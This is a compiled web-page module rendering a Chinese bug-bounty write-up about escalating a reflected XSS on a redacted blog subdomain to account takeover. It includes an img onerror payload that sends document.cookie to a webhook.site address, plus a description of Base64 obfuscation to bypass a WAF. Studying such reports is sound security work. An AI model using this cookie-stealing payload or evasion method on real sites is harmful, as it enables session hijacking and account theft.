import{_ as i,o as a,c as e,ag as t}from"./chunks/framework.BLeoozAw.js";const n="/Awesome-SRC-experience/img/1_RoZet6wDPJj_WVBnv9x3iQ.png",l="/Awesome-SRC-experience/img/1_Y2y1BGAfk8SIIUha_AuRMQ.png",u=JSON.parse('{"title":"XSS to Account Takeover: The jp.redacted.com Case","description":"How a simple reflected XSS on a millions-user blog site was escalated to a full Account Takeover (ATO) using Base64 encoding.","frontmatter":{"title":"XSS to Account Takeover: The jp.redacted.com Case","description":"How a simple reflected XSS on a millions-user blog site was escalated to a full Account Takeover (ATO) using Base64 encoding.","category":"Injection","difficulty":"Medium","tags":["XSS","ATO","Account-Takeover","Base64-Encoding"],"author":"Redacted Researcher","date":"2026-04-06"},"headers":[],"relativePath":"experience/url-injection/url-injection.md","filePath":"experience/url-injection/url-injection.md"}'),o={name:"experience/url-injection/url-injection.md"};function h(p,s,r,c,k,d){return a(),e("div",null,[...s[0]||(s[0]=[t('<h1 id="🛡️-xss-进阶实战-从反射型-xss-到-账户劫持-ato" tabindex="-1">🛡️ XSS 进阶实战：从反射型 XSS 到 账户劫持 (ATO) <a class="header-anchor" href="#🛡️-xss-进阶实战-从反射型-xss-到-账户劫持-ato" aria-label="Permalink to &quot;🛡️ XSS 进阶实战：从反射型 XSS 到 账户劫持 (ATO)&quot;">​</a></h1><div class="tip custom-block github-alert"><p class="custom-block-title">TIP</p><p><strong>核心战术</strong>: 载荷逃逸 (Payload Evasion)。当传统的 <code>&amp;lt;script&amp;gt;</code> 被拦截或失效时，利用 <code>Base64</code> 编码或 HTML 属性事件 (<code>onerror</code>) 来绕过简单的字符串过滤，实现敏感信息（Cookie）的外带。</p></div><p>在寻找一个拥有数百万用户的程序时，我特别关注了一个大型博客网站，这里姑且称之为 <code>redacted.com</code>。我首先对其子域名进行了枚举。我发现的一个子域名是 <code>jp.redacted.com</code>。</p><h2 id="漏洞发现-参数挖掘" tabindex="-1">漏洞发现：参数挖掘 <a class="header-anchor" href="#漏洞发现-参数挖掘" aria-label="Permalink to &quot;漏洞发现：参数挖掘&quot;">​</a></h2><p>接下来，我使用 <code>Param Spider</code> 工具来收集所有可能的参数。</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">param</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> spider</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> jp.redacted.com</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -s</span></span></code></pre></div><p>此命令在终端中列出了所有可能的参数。其中，我发现了一个名为 <code>s=</code> 的参数，它允许我使用简单载荷执行反射型 XSS (RXSS)：</p><div class="language-html vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">alert</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">1</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)&lt;/</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">script</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p><img src="'+n+'" alt=""></p><h2 id="攻链提升-账户劫持-ato" tabindex="-1">攻链提升：账户劫持 (ATO) <a class="header-anchor" href="#攻链提升-账户劫持-ato" aria-label="Permalink to &quot;攻链提升：账户劫持 (ATO)&quot;">​</a></h2><p>成功执行 XSS 后，我尝试将漏洞升级为 <strong>账户劫持 (Account Takeover)</strong>。我的最初尝试是直接注入窃取 Cookie 的脚本：</p><div class="language-html vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">html</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&lt;</span><span style="--shiki-light:#22863A;--shiki-dark:#85E89D;">img</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> src</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;x&quot;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;"> onerror</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">=</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">document</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">.</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">location</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">https</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">:</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">//webhook.site/790fbd5e-8cc4-441e-9a81-6ac18f40cb5f?c=</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&#39;</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">+document.cookie;</span><span style="--shiki-light:#B31D28;--shiki-light-font-style:italic;--shiki-dark:#FDAEB7;--shiki-dark-font-style:italic;">&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">&gt;</span></span></code></pre></div><p>然而，常规载荷由于服务端过滤或 WAF 规则未能生效。</p><h3 id="绕过策略-base64-编码" tabindex="-1">绕过策略：Base64 编码 <a class="header-anchor" href="#绕过策略-base64-编码" aria-label="Permalink to &quot;绕过策略：Base64 编码&quot;">​</a></h3><p>经过多次尝试，我决定对 Payload 进行 <strong>Base64 混淆</strong>。令我惊讶的是，这种简单的绕过手段直接穿透了过滤机制，载荷成功执行并捕获了受害者的 Cookie。</p><p><img src="'+l+'" alt=""></p><div class="caution custom-block github-alert"><p class="custom-block-title">CAUTION</p><p><strong>漏洞影响</strong>: 攻击者可以伪造合法用户身份，完全接管博客账户，并可能通过 Cookie 中的 Session 进行更深层次的横向渗透。</p></div><h2 id="🛠️-使用的工具" tabindex="-1">🛠️ 使用的工具 <a class="header-anchor" href="#🛠️-使用的工具" aria-label="Permalink to &quot;🛠️ 使用的工具&quot;">​</a></h2><ul><li><strong>Param Spider</strong>: 自动化参数挖掘利器，专门用于从 Wayback Machine 等网络存档中提取潜在的注入点。</li></ul><hr><p><em>注：该漏洞已向官方报告。</em></p>',21)])])}const E=i(o,[["render",h]]);export{u as __pageData,E as default};
